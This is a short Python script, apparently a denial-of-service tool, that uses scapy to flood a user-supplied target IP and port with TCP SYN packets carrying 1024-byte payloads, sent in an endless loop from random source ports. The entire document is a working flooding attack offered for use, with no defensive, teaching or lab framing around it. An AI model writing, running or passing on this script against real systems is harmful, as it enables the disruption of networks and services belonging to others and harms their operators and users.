from scapy.all import *

ip = input("Enter the target ip => ")
port = int(input("Enter the target port => "))

def ddos(target_ip, target_port):
  ip = IP(dst=target_ip)
  tcp = TCP(sport=RandShort(), dport=port, flags='S')
  raw = Raw(b'X'*1024)
  p = ip/tcp/raw
  send(p, loop=1, verbose=1)

ddos(ip, port)
